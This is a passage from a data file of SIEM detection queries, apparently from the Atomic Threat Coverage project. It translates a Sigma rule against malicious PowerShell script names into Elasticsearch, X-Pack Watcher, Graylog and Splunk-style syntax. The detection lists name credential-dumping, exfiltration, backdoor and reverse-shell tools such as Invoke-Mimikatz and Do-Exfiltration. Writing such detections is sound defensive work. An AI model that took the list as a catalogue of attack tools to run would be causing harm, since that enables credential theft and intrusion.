'*\\Find-TrustedDocuments.ps1'\n            - '*\\Invoke-Paranoia.ps1'\n            - '*\\Invoke-WinEnum.ps1'\n            - '*\\Invoke-ARPScan.ps1'\n            - '*\\Invoke-PortScan.ps1'\n            - '*\\Invoke-ReverseDNSLookup.ps1'\n            - '*\\Invoke-SMBScanner.ps1'\n            - '*\\Invoke-Mimikittenz.ps1'\n    condition: selection\nfalsepositives:\n    - Penetration Tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:(*\\\\\\\\Invoke\\\\-DllInjection.ps1 OR *\\\\\\\\Invoke\\\\-WmiCommand.ps1 OR *\\\\\\\\Get\\\\-GPPPassword.ps1 OR *\\\\\\\\Get\\\\-Keystrokes.ps1 OR *\\\\\\\\Get\\\\-VaultCredential.ps1 OR *\\\\\\\\Invoke\\\\-CredentialInjection.ps1 OR *\\\\\\\\Invoke\\\\-Mimikatz.ps1 OR *\\\\\\\\Invoke\\\\-NinjaCopy.ps1 OR *\\\\\\\\Invoke\\\\-TokenManipulation.ps1 OR *\\\\\\\\Out\\\\-Minidump.ps1 OR *\\\\\\\\VolumeShadowCopyTools.ps1 OR *\\\\\\\\Invoke\\\\-ReflectivePEInjection.ps1 OR *\\\\\\\\Get\\\\-TimedScreenshot.ps1 OR *\\\\\\\\Invoke\\\\-UserHunter.ps1 OR *\\\\\\\\Find\\\\-GPOLocation.ps1 OR *\\\\\\\\Invoke\\\\-ACLScanner.ps1 OR *\\\\\\\\Invoke\\\\-DowngradeAccount.ps1 OR *\\\\\\\\Get\\\\-ServiceUnquoted.ps1 OR *\\\\\\\\Get\\\\-ServiceFilePermission.ps1 OR *\\\\\\\\Get\\\\-ServicePermission.ps1 OR *\\\\\\\\Invoke\\\\-ServiceAbuse.ps1 OR *\\\\\\\\Install\\\\-ServiceBinary.ps1 OR *\\\\\\\\Get\\\\-RegAutoLogon.ps1 OR *\\\\\\\\Get\\\\-VulnAutoRun.ps1 OR *\\\\\\\\Get\\\\-VulnSchTask.ps1 OR *\\\\\\\\Get\\\\-UnattendedInstallFile.ps1 OR *\\\\\\\\Get\\\\-WebConfig.ps1 OR *\\\\\\\\Get\\\\-ApplicationHost.ps1 OR *\\\\\\\\Get\\\\-RegAlwaysInstallElevated.ps1 OR *\\\\\\\\Get\\\\-Unconstrained.ps1 OR *\\\\\\\\Add\\\\-RegBackdoor.ps1 OR *\\\\\\\\Add\\\\-ScrnSaveBackdoor.ps1 OR *\\\\\\\\Gupt\\\\-Backdoor.ps1 OR *\\\\\\\\Invoke\\\\-ADSBackdoor.ps1 OR *\\\\\\\\Enabled\\\\-DuplicateToken.ps1 OR *\\\\\\\\Invoke\\\\-PsUaCme.ps1 OR *\\\\\\\\Remove\\\\-Update.ps1 OR *\\\\\\\\Check\\\\-VM.ps1 OR *\\\\\\\\Get\\\\-LSASecret.ps1 OR *\\\\\\\\Get\\\\-PassHashes.ps1 OR *\\\\\\\\Show\\\\-TargetScreen.ps1 OR *\\\\\\\\Port\\\\-Scan.ps1 OR *\\\\\\\\Invoke\\\\-PoshRatHttp.ps1 OR *\\\\\\\\Invoke\\\\-PowerShellTCP.ps1 OR *\\\\\\\\Invoke\\\\-PowerShellWMI.ps1 OR *\\\\\\\\Add\\\\-Exfiltration.ps1 OR *\\\\\\\\Add\\\\-Persistence.ps1 OR *\\\\\\\\Do\\\\-Exfiltration.ps1 OR *\\\\\\\\Start\\\\-CaptureServer.ps1 OR *\\\\\\\\Invoke\\\\-ShellCode.ps1 OR *\\\\\\\\Get\\\\-ChromeDump.ps1 OR *\\\\\\\\Get\\\\-ClipboardContents.ps1 OR *\\\\\\\\Get\\\\-FoxDump.ps1 OR *\\\\\\\\Get\\\\-IndexedItem.ps1 OR *\\\\\\\\Get\\\\-Screenshot.ps1 OR *\\\\\\\\Invoke\\\\-Inveigh.ps1 OR *\\\\\\\\Invoke\\\\-NetRipper.ps1 OR *\\\\\\\\Invoke\\\\-EgressCheck.ps1 OR *\\\\\\\\Invoke\\\\-PostExfil.ps1 OR *\\\\\\\\Invoke\\\\-PSInject.ps1 OR *\\\\\\\\Invoke\\\\-RunAs.ps1 OR *\\\\\\\\MailRaider.ps1 OR *\\\\\\\\New\\\\-HoneyHash.ps1 OR *\\\\\\\\Set\\\\-MacAttribute.ps1 OR *\\\\\\\\Invoke\\\\-DCSync.ps1 OR *\\\\\\\\Invoke\\\\-PowerDump.ps1 OR *\\\\\\\\Exploit\\\\-Jboss.ps1 OR *\\\\\\\\Invoke\\\\-ThunderStruck.ps1 OR *\\\\\\\\Invoke\\\\-VoiceTroll.ps1 OR *\\\\\\\\Set\\\\-Wallpaper.ps1 OR *\\\\\\\\Invoke\\\\-InveighRelay.ps1 OR *\\\\\\\\Invoke\\\\-PsExec.ps1 OR *\\\\\\\\Invoke\\\\-SSHCommand.ps1 OR *\\\\\\\\Get\\\\-SecurityPackages.ps1 OR *\\\\\\\\Install\\\\-SSP.ps1 OR *\\\\\\\\Invoke\\\\-BackdoorLNK.ps1 OR *\\\\\\\\PowerBreach.ps1 OR *\\\\\\\\Get\\\\-SiteListPassword.ps1 OR *\\\\\\\\Get\\\\-System.ps1 OR *\\\\\\\\Invoke\\\\-BypassUAC.ps1 OR *\\\\\\\\Invoke\\\\-Tater.ps1 OR *\\\\\\\\Invoke\\\\-WScriptBypassUAC.ps1 OR *\\\\\\\\PowerUp.ps1 OR *\\\\\\\\PowerView.ps1 OR *\\\\\\\\Get\\\\-RickAstley.ps1 OR *\\\\\\\\Find\\\\-Fruit.ps1 OR *\\\\\\\\HTTP\\\\-Login.ps1 OR *\\\\\\\\Find\\\\-TrustedDocuments.ps1 OR *\\\\\\\\Invoke\\\\-Paranoia.ps1 OR *\\\\\\\\Invoke\\\\-WinEnum.ps1 OR *\\\\\\\\Invoke\\\\-ARPScan.ps1 OR *\\\\\\\\Invoke\\\\-PortScan.ps1 OR *\\\\\\\\Invoke\\\\-ReverseDNSLookup.ps1 OR *\\\\\\\\Invoke\\\\-SMBScanner.ps1 OR *\\\\\\\\Invoke\\\\-Mimikittenz.ps1))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Malicious-PowerShell-Commandlet-Names <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Malicious PowerShell Commandlet Names\",\\n    \"description\": \"Detects the creation of known powershell scripts for exploitation\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:(*\\\\\\\\\\\\\\\\Invoke\\\\\\\\-DllInjection.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-WmiCommand.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-GPPPassword.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-Keystrokes.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-VaultCredential.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-CredentialInjection.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Mimikatz.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-NinjaCopy.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-TokenManipulation.ps1 OR *\\\\\\\\\\\\\\\\Out\\\\\\\\-Minidump.ps1 OR *\\\\\\\\\\\\\\\\VolumeShadowCopyTools.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ReflectivePEInjection.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-TimedScreenshot.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-UserHunter.ps1 OR *\\\\\\\\\\\\\\\\Find\\\\\\\\-GPOLocation.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ACLScanner.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-DowngradeAccount.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ServiceUnquoted.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ServiceFilePermission.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ServicePermission.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ServiceAbuse.ps1 OR *\\\\\\\\\\\\\\\\Install\\\\\\\\-ServiceBinary.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-RegAutoLogon.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-VulnAutoRun.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-VulnSchTask.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-UnattendedInstallFile.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-WebConfig.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ApplicationHost.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-RegAlwaysInstallElevated.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-Unconstrained.ps1 OR *\\\\\\\\\\\\\\\\Add\\\\\\\\-RegBackdoor.ps1 OR *\\\\\\\\\\\\\\\\Add\\\\\\\\-ScrnSaveBackdoor.ps1 OR *\\\\\\\\\\\\\\\\Gupt\\\\\\\\-Backdoor.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ADSBackdoor.ps1 OR *\\\\\\\\\\\\\\\\Enabled\\\\\\\\-DuplicateToken.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PsUaCme.ps1 OR *\\\\\\\\\\\\\\\\Remove\\\\\\\\-Update.ps1 OR *\\\\\\\\\\\\\\\\Check\\\\\\\\-VM.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-LSASecret.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-PassHashes.ps1 OR *\\\\\\\\\\\\\\\\Show\\\\\\\\-TargetScreen.ps1 OR *\\\\\\\\\\\\\\\\Port\\\\\\\\-Scan.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PoshRatHttp.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PowerShellTCP.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PowerShellWMI.ps1 OR *\\\\\\\\\\\\\\\\Add\\\\\\\\-Exfiltration.ps1 OR *\\\\\\\\\\\\\\\\Add\\\\\\\\-Persistence.ps1 OR *\\\\\\\\\\\\\\\\Do\\\\\\\\-Exfiltration.ps1 OR *\\\\\\\\\\\\\\\\Start\\\\\\\\-CaptureServer.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ShellCode.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ChromeDump.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ClipboardContents.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-FoxDump.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-IndexedItem.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-Screenshot.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Inveigh.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-NetRipper.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-EgressCheck.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PostExfil.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PSInject.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-RunAs.ps1 OR *\\\\\\\\\\\\\\\\MailRaider.ps1 OR *\\\\\\\\\\\\\\\\New\\\\\\\\-HoneyHash.ps1 OR *\\\\\\\\\\\\\\\\Set\\\\\\\\-MacAttribute.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-DCSync.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PowerDump.ps1 OR *\\\\\\\\\\\\\\\\Exploit\\\\\\\\-Jboss.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ThunderStruck.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-VoiceTroll.ps1 OR *\\\\\\\\\\\\\\\\Set\\\\\\\\-Wallpaper.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-InveighRelay.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PsExec.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-SSHCommand.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-SecurityPackages.ps1 OR *\\\\\\\\\\\\\\\\Install\\\\\\\\-SSP.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-BackdoorLNK.ps1 OR *\\\\\\\\\\\\\\\\PowerBreach.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-SiteListPassword.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-System.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-BypassUAC.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Tater.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-WScriptBypassUAC.ps1 OR *\\\\\\\\\\\\\\\\PowerUp.ps1 OR *\\\\\\\\\\\\\\\\PowerView.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-RickAstley.ps1 OR *\\\\\\\\\\\\\\\\Find\\\\\\\\-Fruit.ps1 OR *\\\\\\\\\\\\\\\\HTTP\\\\\\\\-Login.ps1 OR *\\\\\\\\\\\\\\\\Find\\\\\\\\-TrustedDocuments.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Paranoia.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-WinEnum.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ARPScan.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PortScan.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ReverseDNSLookup.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-SMBScanner.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Mimikittenz.ps1))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:(*\\\\\\\\\\\\\\\\Invoke\\\\\\\\-DllInjection.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-WmiCommand.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-GPPPassword.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-Keystrokes.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-VaultCredential.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-CredentialInjection.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Mimikatz.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-NinjaCopy.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-TokenManipulation.ps1 OR *\\\\\\\\\\\\\\\\Out\\\\\\\\-Minidump.ps1 OR *\\\\\\\\\\\\\\\\VolumeShadowCopyTools.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ReflectivePEInjection.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-TimedScreenshot.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-UserHunter.ps1 OR *\\\\\\\\\\\\\\\\Find\\\\\\\\-GPOLocation.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ACLScanner.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-DowngradeAccount.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ServiceUnquoted.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ServiceFilePermission.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ServicePermission.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ServiceAbuse.ps1 OR *\\\\\\\\\\\\\\\\Install\\\\\\\\-ServiceBinary.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-RegAutoLogon.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-VulnAutoRun.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-VulnSchTask.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-UnattendedInstallFile.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-WebConfig.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ApplicationHost.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-RegAlwaysInstallElevated.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-Unconstrained.ps1 OR *\\\\\\\\\\\\\\\\Add\\\\\\\\-RegBackdoor.ps1 OR *\\\\\\\\\\\\\\\\Add\\\\\\\\-ScrnSaveBackdoor.ps1 OR *\\\\\\\\\\\\\\\\Gupt\\\\\\\\-Backdoor.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ADSBackdoor.ps1 OR *\\\\\\\\\\\\\\\\Enabled\\\\\\\\-DuplicateToken.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PsUaCme.ps1 OR *\\\\\\\\\\\\\\\\Remove\\\\\\\\-Update.ps1 OR *\\\\\\\\\\\\\\\\Check\\\\\\\\-VM.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-LSASecret.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-PassHashes.ps1 OR *\\\\\\\\\\\\\\\\Show\\\\\\\\-TargetScreen.ps1 OR *\\\\\\\\\\\\\\\\Port\\\\\\\\-Scan.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PoshRatHttp.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PowerShellTCP.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PowerShellWMI.ps1 OR *\\\\\\\\\\\\\\\\Add\\\\\\\\-Exfiltration.ps1 OR *\\\\\\\\\\\\\\\\Add\\\\\\\\-Persistence.ps1 OR *\\\\\\\\\\\\\\\\Do\\\\\\\\-Exfiltration.ps1 OR *\\\\\\\\\\\\\\\\Start\\\\\\\\-CaptureServer.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ShellCode.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ChromeDump.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-ClipboardContents.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-FoxDump.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-IndexedItem.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-Screenshot.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Inveigh.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-NetRipper.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-EgressCheck.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PostExfil.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PSInject.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-RunAs.ps1 OR *\\\\\\\\\\\\\\\\MailRaider.ps1 OR *\\\\\\\\\\\\\\\\New\\\\\\\\-HoneyHash.ps1 OR *\\\\\\\\\\\\\\\\Set\\\\\\\\-MacAttribute.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-DCSync.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PowerDump.ps1 OR *\\\\\\\\\\\\\\\\Exploit\\\\\\\\-Jboss.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ThunderStruck.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-VoiceTroll.ps1 OR *\\\\\\\\\\\\\\\\Set\\\\\\\\-Wallpaper.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-InveighRelay.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PsExec.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-SSHCommand.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-SecurityPackages.ps1 OR *\\\\\\\\\\\\\\\\Install\\\\\\\\-SSP.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-BackdoorLNK.ps1 OR *\\\\\\\\\\\\\\\\PowerBreach.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-SiteListPassword.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-System.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-BypassUAC.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Tater.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-WScriptBypassUAC.ps1 OR *\\\\\\\\\\\\\\\\PowerUp.ps1 OR *\\\\\\\\\\\\\\\\PowerView.ps1 OR *\\\\\\\\\\\\\\\\Get\\\\\\\\-RickAstley.ps1 OR *\\\\\\\\\\\\\\\\Find\\\\\\\\-Fruit.ps1 OR *\\\\\\\\\\\\\\\\HTTP\\\\\\\\-Login.ps1 OR *\\\\\\\\\\\\\\\\Find\\\\\\\\-TrustedDocuments.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Paranoia.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-WinEnum.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ARPScan.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-PortScan.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-ReverseDNSLookup.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-SMBScanner.ps1 OR *\\\\\\\\\\\\\\\\Invoke\\\\\\\\-Mimikittenz.ps1))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Malicious PowerShell Commandlet Names\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:(*\\\\\\\\Invoke\\\\-DllInjection.ps1 *\\\\\\\\Invoke\\\\-WmiCommand.ps1 *\\\\\\\\Get\\\\-GPPPassword.ps1 *\\\\\\\\Get\\\\-Keystrokes.ps1 *\\\\\\\\Get\\\\-VaultCredential.ps1 *\\\\\\\\Invoke\\\\-CredentialInjection.ps1 *\\\\\\\\Invoke\\\\-Mimikatz.ps1 *\\\\\\\\Invoke\\\\-NinjaCopy.ps1 *\\\\\\\\Invoke\\\\-TokenManipulation.ps1 *\\\\\\\\Out\\\\-Minidump.ps1 *\\\\\\\\VolumeShadowCopyTools.ps1 *\\\\\\\\Invoke\\\\-ReflectivePEInjection.ps1 *\\\\\\\\Get\\\\-TimedScreenshot.ps1 *\\\\\\\\Invoke\\\\-UserHunter.ps1 *\\\\\\\\Find\\\\-GPOLocation.ps1 *\\\\\\\\Invoke\\\\-ACLScanner.ps1 *\\\\\\\\Invoke\\\\-DowngradeAccount.ps1 *\\\\\\\\Get\\\\-ServiceUnquoted.ps1 *\\\\\\\\Get\\\\-ServiceFilePermission.ps1 *\\\\\\\\Get\\\\-ServicePermission.ps1 *\\\\\\\\Invoke\\\\-ServiceAbuse.ps1 *\\\\\\\\Install\\\\-ServiceBinary.ps1 *\\\\\\\\Get\\\\-RegAutoLogon.ps1 *\\\\\\\\Get\\\\-VulnAutoRun.ps1 *\\\\\\\\Get\\\\-VulnSchTask.ps1 *\\\\\\\\Get\\\\-UnattendedInstallFile.ps1 *\\\\\\\\Get\\\\-WebConfig.ps1 *\\\\\\\\Get\\\\-ApplicationHost.ps1 *\\\\\\\\Get\\\\-RegAlwaysInstallElevated.ps1 *\\\\\\\\Get\\\\-Unconstrained.ps1 *\\\\\\\\Add\\\\-RegBackdoor.ps1 *\\\\\\\\Add\\\\-ScrnSaveBackdoor.ps1 *\\\\\\\\Gupt\\\\-Backdoor.ps1 *\\\\\\\\Invoke\\\\-ADSBackdoor.ps1 *\\\\\\\\Enabled\\\\-DuplicateToken.ps1 *\\\\\\\\Invoke\\\\-PsUaCme.ps1 *\\\\\\\\Remove\\\\-Update.ps1 *\\\\\\\\Check\\\\-VM.ps1 *\\\\\\\\Get\\\\-LSASecret.ps1 *\\\\\\\\Get\\\\-PassHashes.ps1 *\\\\\\\\Show\\\\-TargetScreen.ps1 *\\\\\\\\Port\\\\-Scan.ps1 *\\\\\\\\Invoke\\\\-PoshRatHttp.ps1 *\\\\\\\\Invoke\\\\-PowerShellTCP.ps1 *\\\\\\\\Invoke\\\\-PowerShellWMI.ps1 *\\\\\\\\Add\\\\-Exfiltration.ps1 *\\\\\\\\Add\\\\-Persistence.ps1 *\\\\\\\\Do\\\\-Exfiltration.ps1 *\\\\\\\\Start\\\\-CaptureServer.ps1 *\\\\\\\\Invoke\\\\-ShellCode.ps1 *\\\\\\\\Get\\\\-ChromeDump.ps1 *\\\\\\\\Get\\\\-ClipboardContents.ps1 *\\\\\\\\Get\\\\-FoxDump.ps1 *\\\\\\\\Get\\\\-IndexedItem.ps1 *\\\\\\\\Get\\\\-Screenshot.ps1 *\\\\\\\\Invoke\\\\-Inveigh.ps1 *\\\\\\\\Invoke\\\\-NetRipper.ps1 *\\\\\\\\Invoke\\\\-EgressCheck.ps1 *\\\\\\\\Invoke\\\\-PostExfil.ps1 *\\\\\\\\Invoke\\\\-PSInject.ps1 *\\\\\\\\Invoke\\\\-RunAs.ps1 *\\\\\\\\MailRaider.ps1 *\\\\\\\\New\\\\-HoneyHash.ps1 *\\\\\\\\Set\\\\-MacAttribute.ps1 *\\\\\\\\Invoke\\\\-DCSync.ps1 *\\\\\\\\Invoke\\\\-PowerDump.ps1 *\\\\\\\\Exploit\\\\-Jboss.ps1 *\\\\\\\\Invoke\\\\-ThunderStruck.ps1 *\\\\\\\\Invoke\\\\-VoiceTroll.ps1 *\\\\\\\\Set\\\\-Wallpaper.ps1 *\\\\\\\\Invoke\\\\-InveighRelay.ps1 *\\\\\\\\Invoke\\\\-PsExec.ps1 *\\\\\\\\Invoke\\\\-SSHCommand.ps1 *\\\\\\\\Get\\\\-SecurityPackages.ps1 *\\\\\\\\Install\\\\-SSP.ps1 *\\\\\\\\Invoke\\\\-BackdoorLNK.ps1 *\\\\\\\\PowerBreach.ps1 *\\\\\\\\Get\\\\-SiteListPassword.ps1 *\\\\\\\\Get\\\\-System.ps1 *\\\\\\\\Invoke\\\\-BypassUAC.ps1 *\\\\\\\\Invoke\\\\-Tater.ps1 *\\\\\\\\Invoke\\\\-WScriptBypassUAC.ps1 *\\\\\\\\PowerUp.ps1 *\\\\\\\\PowerView.ps1 *\\\\\\\\Get\\\\-RickAstley.ps1 *\\\\\\\\Find\\\\-Fruit.ps1 *\\\\\\\\HTTP\\\\-Login.ps1 *\\\\\\\\Find\\\\-TrustedDocuments.ps1 *\\\\\\\\Invoke\\\\-Paranoia.ps1 *\\\\\\\\Invoke\\\\-WinEnum.ps1 *\\\\\\\\Invoke\\\\-ARPScan.ps1 *\\\\\\\\Invoke\\\\-PortScan.ps1 *\\\\\\\\Invoke\\\\-ReverseDNSLookup.ps1 *\\\\\\\\Invoke\\\\-SMBScanner.ps1 *\\\\\\\\Invoke\\\\-Mimikittenz.ps1))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"11\" (TargetFilename=\"*\\\\\\\\Invoke-DllInjection.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-WmiCommand.ps1\" OR TargetFilename=\"*\\\\\\\\Get-GPPPassword.ps1\" OR TargetFilename=\"*\\\\\\\\Get-Keystrokes.ps1\" OR TargetFilename=\"*\\\\\\\\Get-VaultCredential.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-CredentialInjection.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-Mimikatz.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-NinjaCopy.ps1\" OR TargetFilename=\"*\\\\\\\\Invoke-TokenManipulation.ps1\" 